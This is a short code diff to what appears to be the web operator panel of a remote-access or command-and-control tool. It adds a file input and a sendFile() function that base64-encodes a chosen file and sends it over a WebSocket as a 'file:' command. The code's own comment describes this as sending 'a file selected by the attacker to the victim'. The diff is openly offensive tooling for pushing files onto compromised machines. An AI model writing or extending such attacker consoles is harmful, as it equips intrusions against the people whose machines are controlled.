@@ -84,6 +84,12 @@
   </div>
 
   <div class="section">
+    <label for="fileInput">📁 Select File:</label><br>
+    <input id="fileInput" type="file">
+    <button onclick="sendFile()">Send File</button>
+  </div>
+
+  <div class="section">
     <label>📡 Log Output</label>
     <div>
       <button onclick="copyLog()">📋 Copy</button>
@@ -248,6 +254,27 @@
         }
       }
       return Array.from(ports).filter(p => !isNaN(p));
+    }
+
+    // Function to send a file selected by the attacker to the victim.
+    function sendFile() {
+      const fileInput = document.querySelector("#fileInput");
+      if (!fileInput.files.length) {
+        return alert("No file selected");
+      }
+      const file = fileInput.files[0];
+      const reader = new FileReader();
+      reader.onload = function(event) {
+        // event.target.result is a Data URL (e.g., "data:application/octet-stream;base64,...")
+        const dataUrl = event.target.result;
+        // Extract base64 part (after the comma)
+        const base64Data = dataUrl.split(",")[1];
+        // Construct command in the format: "file:filename|<base64Data>"
+        const command = `file:${file.name}|${base64Data}`;
+        socket.send(command);
+        log(`[FILE SENT] ${file.name} (${file.size} bytes)`);
+      };
+      reader.readAsDataURL(file);
     }
 
     function log(msg) {
